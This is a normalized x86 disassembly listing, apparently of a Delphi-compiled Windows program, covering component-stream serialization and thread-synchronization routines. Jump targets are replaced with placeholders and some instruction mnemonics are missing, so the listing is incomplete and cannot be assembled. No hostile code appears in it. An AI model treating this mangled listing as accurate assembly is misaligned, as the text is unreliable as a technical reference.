mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41daa0
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41daa0
jmp r-xdata
jmp r-xdata
call sub_41d578
sub_41f3f8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f4cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41da7c
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41f33c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404860
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f4d6
lea eax [ ebp - 0xc ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_404008
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41f4dc
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41daa0
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40495c
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41daa0
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41daa0
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404654
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41daa0
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405e08
jmp r-xdata
jmp r-xdata
call sub_41d578
sub_41f4f0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41f52c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41f300
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f533
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41f538
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41d738
test al al
je r-xdata
mov eax [ ebx ]
call sub_41f5ec
mov eax [ ebx ]
call sub_41e6a4
pop ebx
pop ebp
retn
sub_41f560
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41daa0
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f9e4
pop ebx
pop ecx
pop ebp
retn
sub_41f590
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41d738
test al al
je r-xdata
mov eax [ ebx ]
call sub_41da7c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41e6a4
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41f9e4
jmp r-xdata
mov eax [ ebx ]
call sub_41f5ec
mov eax [ ebx ]
call sub_41d738
test al al
je r-xdata
mov eax [ ebx ]
call sub_41f788
mov eax [ ebx ]
call sub_41e6a4
sub_41f5ec
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f77b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41f4dc
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f782
lea eax [ ebp - 0x8 ]
call sub_404008
retn
jmp [ eax * 4 + jump_table_41f623 ]
push ebp
call sub_41f538
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41f9e4
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41f9e4
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41f9e4
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41f9e4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f300
jmp r-xdata
push ebp
mov eax 0x1
call sub_41f560
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f4f0
jmp r-xdata
push ebp
mov eax 0x1
call sub_41f560
pop ecx
jmp r-xdata
push ebp
call sub_41f590
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41f9e4
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f9e4
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f9e4
jmp r-xdata
push ebp
mov eax 0x2
call sub_41f560
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f9e4
jmp r-xdata
push ebp
mov eax 0x1
call sub_41f560
pop ecx
sub_41f788
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41f7c5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41f300
mov eax ebx
call sub_41f5ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f7cc
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41f7d0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41f868
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41d738
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41f300
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41f300
jmp r-xdata
mov eax ebx
call sub_41f788
mov eax ebx
call sub_41e6a4
jmp r-xdata
mov eax ebx
call sub_41d738
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41f7d0
mov eax ebx
call sub_41e6a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f86f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
sub_41f878
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f91d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4040a0
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_420c1c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f924
lea eax [ ebp - 0x8 ]
call sub_404008
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
sub_41f948
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41f970
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41d9d0
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_419b08
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403460
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41d9d0
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41f9e4
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41daa0
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41daa0
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41fa2c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41fbd5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41d604
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41fbb0
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41daa0
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41c530
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41daa0
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cec0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41fb8b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41f33c
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41daa0
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41c530
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41daa0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_415a30
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
lea eax [ ebp - 0x1c ]
call sub_405a38
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d558
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb92
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub_41fbf4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41fdee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40f2ec
mov eax [ ebp - 0x4 ]
call sub_41da7c
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
jmp [ eax * 4 + jump_table_41fc36 ]
mov eax [ ebp - 0x4 ]
call sub_41f4dc
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e5ec
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_4136f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e5ec
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_4136f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e5ec
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_4136f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e3d0
mov eax ebx
call sub_4138ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e414
mov eax ebx
call sub_4138ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e458
mov eax ebx
call sub_413914
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e4a8
mov eax ebx
call sub_413900
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f33c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_413928
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41f3f8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4139a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f4dc
cmp al 0x9
sete dl
mov eax ebx
call sub_4138c4
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41fa2c
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f614
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e658
push edx
push eax
mov eax ebx
call sub_4137f0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fdf5
lea eax [ ebp - 0x1c ]
call sub_40f300
lea eax [ ebp - 0xc ]
call sub_404714
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax ebx
call sub_415b18
jmp r-xdata
sub_41fdfc
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41fe48
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41fe74
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_41ffe4
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41fdfc
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_41ffe4
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41fdfc
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_41ffe4
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41fdfc
jmp r-xdata
pop edx
pop ebx
retn
sub_41fef8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404414
je r-xdata
mov eax esi
call sub_4042c8
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_4042c8
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_41ffe4
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41fdfc
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41fdfc
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_41ffe4
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41fdfc
mov dl 0x6
mov eax ebx
call sub_41ffe4
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41fdfc
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41fdfc
sub_41ff90
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ffd5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41fef8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ffdc
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_420090
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
call sub_420044
mov eax ebx
call sub_420050
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_42021e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4201ff
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420206
mov eax [ ebp - 0xc ]
call sub_403234
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41a468
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41a358
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_4201c9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_42019a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_420230
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_42006c
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_420271
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_404000
mov eax [ ebp - 0x4 ]
call sub_403234
sub_420276
call sub_40286c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_403a3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_42006c
test bl bl
je r-xdata
mov eax esi
call sub_404000
mov eax [ ebp - 0x4 ]
call sub_403234
sub_4202d8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_420382
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403204
call sub_420078
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_420230
xor edx edx
xor eax eax
call sub_403fbc
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_403558
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420389
lea eax [ ebp - 0x10 ]
call sub_404008
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_40b1b4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
sub_4203a8
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
mov eax [ esi + 0x38 ]
call sub_403234
call sub_420084
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_420668
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
mov eax esi
call sub_420670
mov eax esi
call sub_420640
sub_42041c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_42048a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420491
lea eax [ ebp - 0x14 ]
call sub_404008
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b1b4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
sub_4204d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4205fa
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4205dc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_41a30c
call sub_42006c
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_4205bd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4205c4
push rw-data
call EnterCriticalSection
retn
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
sub_420618
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
mov eax [ eax ]
call sub_4204d8
pop ebp
retn 0x8
sub_420640
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_420498
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_420670
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_420498
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_420090
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_420498
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_420714
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_4208cc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_420760
push ebx
push esi
push ecx
call sub_4035c0
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_4209b4
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_42095c
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_41aa38
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_420924
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4035a8
lea eax [ ebx + 0x14 ]
call sub_40d524
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_41a468
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_4207e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41a4c4
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41a30c
mov edx ebx
mov eax esi
call sub_4207e4
sub_420878
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_41a30c
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x10 ] eax
sub_4208a4
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_41a604
mov eax [ ebx + 0x10 ]
